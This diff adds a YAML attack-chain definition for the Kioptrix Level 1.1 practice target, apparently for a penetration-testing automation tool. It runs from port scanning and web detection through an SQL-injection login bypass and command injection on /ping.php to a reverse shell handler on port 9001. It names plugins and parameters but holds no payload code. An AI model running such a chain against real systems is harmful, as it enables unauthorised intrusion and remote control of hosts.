@@ -1,0 +1,36 @@
+name: "Kioptrix Level 1.1"
+target:
+  default_port: 80
+attack_chain:
+  - id: port_scan
+    stage: recon
+    plugin: PortScanPlugin
+    params:
+      ports: [22, 80, 443]
+  - id: web_detect
+    stage: recon
+    plugin: WebDetectPlugin
+    depends_on: [port_scan]
+    params:
+      url: "http://{{target.ip}}:{{target.port}}/"
+  - id: sqli_bypass
+    stage: exploit
+    plugin: SqliLoginBypassPlugin
+    depends_on: [web_detect]
+    params:
+      url: "/login.php"
+      username_field: "user"
+      password_field: "pass"
+  - id: cmd_inject
+    stage: exploit
+    plugin: CmdInjectPlugin
+    depends_on: [sqli_bypass]
+    params:
+      endpoint: "/ping.php"
+      inject_param: "ip"
+  - id: reverse_shell
+    stage: exploit
+    plugin: ReverseShellHandler
+    depends_on: [cmd_inject]
+    params:
+      listener_port: 9001
